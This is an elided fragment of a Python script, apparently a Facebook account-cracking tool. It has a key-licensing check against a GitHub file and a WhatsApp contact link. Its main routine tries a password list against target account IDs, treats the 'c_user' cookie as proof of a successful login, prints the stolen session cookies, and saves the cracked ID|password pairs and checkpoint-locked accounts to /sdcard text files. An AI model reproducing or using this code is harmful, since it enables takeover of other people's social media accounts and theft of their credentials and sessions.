...
def DARKALWAYSONFIRE():
  ...
  id = "᯾".join(uuid)
  server = requests.get(f'https://github.com/coderet-d-looper/ctest/blob/main/testing.txt').text
...
\033[1;92m══════════════════════════════════════════""")
  ...
  #os.system(f'xdg-open https://www.facebook.com/coderet.d.looper')
  time.sleep(1)
  print(f"\033[1;37mChecking Your Key")
  try:
    httpCaht = requests.get(f"https://github.com/coderet-d-looper/ctest/blob/main/testing.txt").text
    if id in httpCaht:
      ...
      os.system(f'xdg-open {tan}://wa.me/+8801576593082?text='+id)
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
...
def m1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [DARK] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        DARK=session.cookies.get_dict().keys()
                        if "c_user" in DARK:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [DARK\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                #cek_apk(session,coki)
                                print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/DARK•OK•M1.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in DARK:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [DARK•CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/DARK•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in DARK:
                                ...
                                #cek_apk(session,coki)
                                print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/DARK•OK•M3.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in DARK:
                                if 'y' in pcp:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in DARK:
                                ...
                                #cek_apk(session,coki)
                                print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/DARK•OK•M2.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in DARK:
                                if 'y' in pcp:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in DARK:
                                ...
                                #cek_apk(session,coki)
                                print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/DARK•OK•M4.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in DARK:
                                if 'y' in pcp:
